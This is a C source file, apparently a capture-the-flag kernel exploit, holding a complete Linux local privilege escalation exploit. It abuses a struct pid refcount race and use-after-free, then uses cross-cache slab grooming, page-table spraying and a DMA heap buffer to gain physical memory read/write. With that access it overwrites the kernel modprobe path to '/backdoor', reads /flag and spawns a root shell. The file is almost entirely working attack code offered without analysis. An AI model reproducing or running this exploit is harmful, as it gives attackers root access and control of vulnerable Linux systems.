#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <termios.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/syscall.h>
#include <sys/eventfd.h>
#include <sys/resource.h>
#include <linux/dma-heap.h>

#define MAX_FORK_NUM 0x30

#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
	_pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))

// cat /sys/kernel/slab/filp/cpu_partial
#define CPU_PARTIAL 30
// cat /sys/kernel/slab/filp/objs_per_slab
#define OBJS_PER_SLAB 32

/*
 * 在尝试降低引用计数之前，struct pid 的引用计数应该提升到多高；
 * 由两个参数的乘积决定。
 */
#define SOCKS_FOR_CREDS 1
#define CREDS_PER_SOCKET 1

/*
 * 尝试竞态条件的频率。
 * 如果程序在初始阶段崩溃，请降低这个数字。
 * 一个有效的漏洞利用可能会使这个数字以指数方式增长，
 * 或者类似的方式。
 */

#define SKEW_ATTEMPTS 2
#define KMOD_PATH_LEN 0x100

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})


/*
 * 通过在所有者调用 listen() 的套接字上连接 @count 次，
 * 将 @count 添加到 struct pid 中。
 * 这样，即使任务已经结束，我们也可以增加 PID 的引用计数。
 */

struct sockaddr_un unix_addr = {
    .sun_family = AF_UNIX,
    .sun_path = "/tmp/exploitsocket"};

void add_to_refcount(int count, int listensock)
{
    for (int i = 0; i < count; i++)
    {
        int refsock = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0));
        SYSCHK(connect(refsock, (struct sockaddr *)&unix_addr, sizeof(unix_addr)));
        SYSCHK(accept(listensock, NULL, NULL) == -1);
    }
}

#define FLUSH_STAT_INPROGRESS 0
#define FLUSH_STAT_DONE 1
#define EXPLOIT_STAT_RUNNING 0
#define EXPLOIT_STAT_FINISHED 3

#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }

static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	
	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
        // printf("[*] munmap finish\n");
		*status = FLUSH_STAT_DONE;
		sleep(9999);
        
	}

	SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
    sleep(0.5);
}

void pin_cpu(int cpu)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    SYSCHK(sched_setaffinity(0, sizeof(cpuset), &cpuset));
}

/*
 * We want the child to be able to close its parent's file descriptors.
 */
#define fork() syscall(__NR_clone, CLONE_FILES | SIGCHLD, NULL, NULL, NULL, 0)

void increase_fds(void)
{
    struct rlimit old_lim, lim;

    if (getrlimit(RLIMIT_NOFILE, &old_lim) != 0)
    {
        printf("[x] `getrlimit()` failed\n");
        exit(-1);
    }

    lim.rlim_cur = old_lim.rlim_max;
    lim.rlim_max = old_lim.rlim_max;

    if (setrlimit(RLIMIT_NOFILE, &lim) != 0)
    {
        printf("[x] `setrlimit()` failed\n");
        exit(-1);
    }
    printf("[*] Increased fd limit from %ld to %ld\n", old_lim.rlim_cur, lim.rlim_cur);
    return;
}
int listensock;
int child_func(void *arg) {
    int num = *((int *)arg);
    add_to_refcount(num, listensock);
    sleep(1);
    while (1)
    {
        /* code */
    }
    
}

void read_file(char *data)
{

    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    read(fd, data, 0x100);
    close(fd);
}

static int strcmp_modprobe_path(char *new_str)
{
	char buf[KMOD_PATH_LEN] = { '\x00' };

	read_file(buf);
    printf("[*] modprobe path : %s\n", buf);
	
	return strncmp(new_str, buf, strlen(new_str));
}

void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len, char *modprobe_path_str, size_t modprobe_path_len)
{
	void *pmd_modprobe_addr;
	pmd_modprobe_addr = memmem(haystack_virt, haystack_len, modprobe_path_str, modprobe_path_len);
	if (pmd_modprobe_addr == NULL)
		return NULL;
	strcpy(pmd_modprobe_addr, "/backdoor");
	if (strcmp_modprobe_path("/backdoor") != 0)
	{
		printf("[-] false positive. skipping to next one\n");
		return NULL;
	}

	return pmd_modprobe_addr;
}

char modprobe_path[0x100] = {0};

int find_mod(void *pte_page, void *dma_page, void *phys_base)
{
    printf("[*] modprobe path: %s\n", modprobe_path);
    for (int i=0; i < 40; i++) 
    {
        void *pmd_modprobe_addr;
        unsigned long long phys_modprobe_addr;
        unsigned long long modprobe_iteration_base;

        modprobe_iteration_base = phys_base + i * 0x200000;

        printf("[*] setting physical address range to 0x%016llx - 0x%016llx\n", modprobe_iteration_base, modprobe_iteration_base + 0x200000);

        // set the pages for the other threads PUD data range to kernel memory
        for (unsigned short j=0; j < 512; j++)
        {
            *(uint64_t *)(dma_page + j * 8) = (modprobe_iteration_base + 0x1000 * j) | 0x8000000000000067;
        }

        flush_tlb(PTI_TO_VIRT(2, 0, 10, 0, 0), 0x200000);
        pmd_modprobe_addr = memmem_modprobe_path(pte_page, 0x200000, modprobe_path, strlen(modprobe_path) - 1);
        if (pmd_modprobe_addr != NULL)
        {
            printf("[*] Found modprobe path at physical address 0x%016llx\n", pmd_modprobe_addr);
            return 1;
        }
    }
    printf("[*] modprobe path: %s\n", modprobe_path);
    return 0;
}

int main(void)
{
    setbuf(stdout, NULL);
    sync(); /* we're probably gonna crash... */

    printf("[*] starting up...\n");
    pin_cpu(0);
    read_file(modprobe_path);

    increase_fds();

    
    printf("[*] prepare PTE memory...\n");
	for (unsigned long long i=0; i < 20; i++)
	{
		void *retv = mmap((void*)PTI_TO_VIRT(2, 0, i, 0, 0), 0x200000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (retv == MAP_FAILED)
        {
            perror("mmap");
            exit(EXIT_FAILURE);
        }
	}

    uid_t myuid = getuid();
    gid_t mygid = getgid();

    pid_t main_task = SYSCHK(fork());
    if (main_task != 0)
    {
        int status;
        if (waitpid(main_task, &status, 0) != main_task)
            err(1, "waitpid main_task");
        return 0;
    }
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1)
        exit(0);

    printf("[*] executing in first level child process, setting up session and PTY pair...\n");

    /* basic preparation */
    SYSCHK(signal(SIGTTOU, SIG_IGN));
    SYSCHK(setsid());

    /* set up a new pty pair */
    int ptmx = SYSCHK(open("/dev/ptmx", O_RDWR));
    unlockpt(ptmx);
    int tty = SYSCHK(open(ptsname(ptmx), O_RDWR));

    /* shared memory for cross-process synchronization */
    volatile char *syncptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    memset((void *)syncptr, 0, 0x1000);
    if ((void *)syncptr == MAP_FAILED)
        err(1, "mmap shared");

    listensock = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0));
    unlink(unix_addr.sun_path);
    SYSCHK(bind(listensock, (struct sockaddr *)&unix_addr, sizeof(unix_addr)));

    //cc1
    printf("[*] Begin cc1\n");
    int ccfile1[(CPU_PARTIAL + 2) * OBJS_PER_SLAB];
    for(int i = 0; i < (CPU_PARTIAL + 2) * OBJS_PER_SLAB; i++)
    {
        ccfile1[i] = SYSCHK(open("/proc/self/maps", O_RDONLY));
    }
    sleep(0.1);
    // cc2
    printf("[*] Begin cc2\n");
    int ccfile2[OBJS_PER_SLAB];
    for (int i = 0; i < OBJS_PER_SLAB - 1; i++)
    {
        ccfile2[i] = SYSCHK(open("/proc/self/maps", O_RDONLY));
    }
    sleep(0.1);
    // cc3
    printf("[*] Begin cc3\n");
    printf("[*] Launching child process\n");
    int parent = getpid();
    int child_i = 0;
    for(child_i = 0; child_i < MAX_FORK_NUM; child_i++)
    {
        pid_t child = SYSCHK(fork());
        if (child == 0)
        {
            SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
            pin_cpu(1);

            SYSCHK(setpgid(0, 0));
            child = getpid();


            for (int attempts = 0; attempts < SKEW_ATTEMPTS; attempts++)
            {
                while (1)
                {
                    char syncval = *syncptr;
                    if ((syncval & 1) == 0)
                    {
                        if (syncval == 10)
                            break;
                        *syncptr = syncval + 1;
                    }
                }
                SYSCHK(ioctl(tty, TIOCSPGRP, &parent));
                *syncptr = 11;
            }
            while(1)
            {
                if(*(syncptr + child_i + 0x100) == 1)
                {
                    if(getpid() == child){
                        *(syncptr + child_i + 0x100) = 2;   // continue
                        while(1){
                            if(*(syncptr + child_i + 0x100) == 4)
                            {
                                *(syncptr + child_i + 0x200) = 1;   // exit the new fork;
                                exit(0);
                            }
                        }
                    }
                    else{
                        printf("[*] child : %d, new-child : %d\n", child, getpid());
                        *(syncptr + child_i + 0x100) = 3;   // find the uaf pid
                        while(1){
                            if(*(syncptr + child_i + 0x100) == 4) {
                                printf("[*] Free the uaf pid again\n");
                                *(syncptr + child_i + 0x200) = 1;   // exit the new fork;
                                while(1)
                                {
                                    if(*(syncptr + child_i + 0x100) == 10)
                                    {
                                        /* create post-death-incrementable pid reference */
                                        SYSCHK(listen(listensock, 128 /*SOMAXCONN*/));
                                        *(syncptr + child_i + 0x100) = 9;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            // printf("[*] refcount should now be skewed, child exiting\n");
            // return -1;
            // exit(-1);
        }
        for (int attempts = 0; attempts < SKEW_ATTEMPTS; attempts++)
        {
            SYSCHK(ioctl(ptmx, TIOCSPGRP, &child));
            *syncptr = 0;
            while (1)
            {
                char syncval = *syncptr;
                if ((syncval & 1) == 1)
                {
                    *syncptr = syncval + 1;
                    if (syncval == 9)
                        break;
                }
            }
            SYSCHK(ioctl(ptmx, TIOCSPGRP, &parent));
            while (*syncptr != 11)
                ;
        }
        // getchar();p
        int fack = fork();
        if(fack == 0)
        {
            while(1){
                if(*(syncptr + child_i + 0x200) == 1) exit(0);
            }
        }
        *(syncptr + 0x100 + child_i) = 1;
        while(1)
        {
            if(*(syncptr + child_i + 0x100) == 2)
            {
                 break;
            }else if(*(syncptr + child_i + 0x100) == 3)
            {
                break;
            }
        }

        if(*(syncptr + child_i + 0x100) == 3)
        {
            printf("[*] Find the uaf pid in child : %d\n", child_i);
            break;
        }
    }
    if(child_i == MAX_FORK_NUM)
    {
        printf("[*] Can't find the uaf pid\n");
        for(int i = 0; i < (CPU_PARTIAL + 2) * OBJS_PER_SLAB; i++)
        {
            close(ccfile1[i]);
        }
        for(int i = 0; i < OBJS_PER_SLAB - 1; i++)
        {
            close(ccfile2[i]);
        }
        return -1;
    }
    sleep(0.1);
    // cc4
    printf("[*] Begin cc4\n");
    int ccfile4[OBJS_PER_SLAB + 1];
    for(int i = 0; i < OBJS_PER_SLAB + 1; i++)
    {
        ccfile4[i] = SYSCHK(open("/proc/self/maps", O_RDONLY));
    }
    sleep(0.1);

    printf("[*] UAF pid id : %d\n", child_i);
    printf("[*] Free the uaf pid\n");
    *(syncptr + 0x100 + child_i) = 4;
    wait(NULL);
    for(int i = 0; i < child_i; i++)
    {
        *(syncptr + 0x100 + i) = 4;
    }
    for(int i = 0; i < 2 * child_i; i++)
    {
        wait(NULL);
    }
    printf("[*] Free finish\n");
    sleep(0.1);
    printf("[*] Free the struct around uaf pid\n");
    for(int i = 0; i < OBJS_PER_SLAB; i++)
    {
        (close(ccfile4[i]));
    }
    for(int i = OBJS_PER_SLAB - 1; i >= 0; i--)
    {
        (close(ccfile2[i]));
    }

    printf("[*] Free the struct in first %d page\n", CPU_PARTIAL);
    for(int i = (CPU_PARTIAL + 2) * OBJS_PER_SLAB - 1; i >= 0; i--)
    {
        if(i % OBJS_PER_SLAB == 0)
        {
            (close(ccfile1[i]));
        }
    }

    sleep(1);
    printf("[*] Finish cc !\n");
    // getchar();
    // await_rcu_call();
    printf("[*] spraying 10 pte's...\n");
	for (unsigned long long i=0; i < 10; i++)
	{
		for(unsigned long long j = 0; j < 0x1000/8; j++)
        {
            if(j % 0x10 == 0)
            {
                *(uint64_t*)PTI_TO_VIRT(2, 0, i, j, 0) = (uint64_t *)PTI_TO_VIRT(2, 0, i, j, 0);
            }
        }
	}
    printf("[*] spraying finish\n");

    for(int i = (CPU_PARTIAL + 2) * OBJS_PER_SLAB - 1; i >= 0; i--)
    {
        if(i % OBJS_PER_SLAB != 0)
        {
            SYSCHK(close(ccfile1[i]));
        }
    }

    *(syncptr + child_i + 0x100) = 10;
    while(*(syncptr + child_i + 0x100) != 9)
    {

    }
    char *stack;
    char *stack_top;
#define STACK_SIZE (1024 * 1024)
    // 为子进程分配栈空间
    stack = malloc(STACK_SIZE);
    if (stack == NULL) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    stack_top = stack + STACK_SIZE;

    int flags = SIGCHLD;

    // 创建子进程
    int times = 0x400;
    clone(child_func, stack_top, flags | SIGCHLD, &times);
    clone(child_func, stack_top, flags | SIGCHLD, &times);
    clone(child_func, stack_top, flags | SIGCHLD, &times);
    times = 0x3ff;
    clone(child_func, stack_top, flags | SIGCHLD, &times);

    uint64_t *victim_pte = NULL;
    uint64_t *pte_page = NULL;
    int victim_i = 0;    
    int victim_i_1 = 0;

    for(int i = 0; i < 10; i++)
    {
        flush_tlb(PTI_TO_VIRT(2, 0, i, 0, 0), 0x200000);
    }

    for (unsigned long long i=0; i < 10; i++)
	{
		for(unsigned long long j = 0; j < 0x1000/8; j++)
        {
            if(j % 0x10 == 0)
            {
                if(*(uint64_t*)PTI_TO_VIRT(2, 0, i, j, 0) != (uint64_t )PTI_TO_VIRT(2, 0, i, j, 0))
                {
                    victim_pte = (uint64_t*)PTI_TO_VIRT(2, 0, i, j, 0);
                    victim_i = i;
                    printf("[*] Find the pte in 0x%lx, value 0x%lx\n", victim_pte, *victim_pte);
                    break;
                }
            }
        }
	}

    if (victim_pte == NULL)
    {
        printf("[x] failed to find victim pte\n");
        while (1)
        {
            /* code */
        }
        
    }

    printf("[*] Start dma\n");
    int dma_heap_fd = SYSCHK(open("/dev/dma_heap/system", O_RDWR));
    struct dma_heap_allocation_data data;

    data.len = 0x1000;
    data.fd_flags = O_RDWR;
    data.heap_flags = 0;
    data.fd = 0;

    if (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &data) < 0) {
        perror("DMA_HEAP_IOCTL_ALLOC");
        return -1;
    }
    int dma_buf_fd = data.fd;
    printf("[*] dma_buf_fd : %d\n", dma_buf_fd);
    printf("[*] Start to unmap\n");
    munmap(victim_pte, 0x1000);
    void* dma_page = mmap(victim_pte, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, dma_buf_fd, 0);
    *(uint64_t*)dma_page = 0x4141414141414141;
    
    for (unsigned long long i=10; i < 20; i++)
	{
		*(uint64_t*)PTI_TO_VIRT(2, 0, i, 0, 0) = (uint64_t *)PTI_TO_VIRT(2, 0, i, 0, 0);
	}

    printf("[*] spraying finish\n");
    times = 0x400;
    for(int i = 0; i < 4; i++)
    {
        clone(child_func, stack_top, flags | SIGCHLD, &times);
    }

    for(int i = 0; i < 10; i++)
    {
        flush_tlb(PTI_TO_VIRT(2, 0, i, 0, 0), 0x200000);
    }
    printf("[*] Find the dma in 0x%lx, pte-value 0x%lx\n", dma_page, *(uint64_t *)dma_page);
    *(uint64_t *)dma_page = *(uint64_t *)dma_page + 0x4000;
    for(int i = 0; i < 20; i++)
    {
        flush_tlb(PTI_TO_VIRT(2, 0, i, 0, 0), 0x200000);
    }

    uint64_t physical_addr;
    
    for (unsigned long long i = 10; i < 20; i++)
	{
        if(*(uint64_t*)PTI_TO_VIRT(2, 0, i, 0, 0) != (uint64_t )PTI_TO_VIRT(2, 0, i, 0, 0))
        {
            pte_page = (uint64_t*)PTI_TO_VIRT(2, 0, i, 0, 0);
            printf("[*] Find the pte-1 in 0x%lx, value 0x%lx\n", pte_page, *pte_page);
            break;
        }
	}
    *(uint64_t*)dma_page = 0x8000000000000067;
    uint64_t phys_base;
    for (int i = 0;;i++) 
    {
        flush_tlb(PTI_TO_VIRT(2, 0, 10, 0, 0), 0x200000);
        if (*(uint64_t*)pte_page == 0xe801403f51258d48) {
                printf("\033[32m[+] pte: %#llx  NUMBER TAG: %#llx\n\033[0m", *(uint64_t*)dma_page, *(uint64_t*)pte_page);
                phys_base = *(uint64_t*)dma_page;
                if(find_mod(pte_page, dma_page, phys_base) == 1)
                {
                    break;
                }
        }
        *(uint64_t*)dma_page = *(uint64_t*)dma_page + 0x100000;
    }
    system("/error");
    // system("/bin/sh");
    // execl("/bin/sh", "sh", NULL);

    char buf[0x100];
    int flagfd = open("/flag", O_RDONLY);
    read(flagfd, buf, 0x100);
    printf("[*] flag : %s\n", buf);
    system("/bin/sh");
    while(1)
    {

    }
    printf("EXIT\n");
    return 0;
}
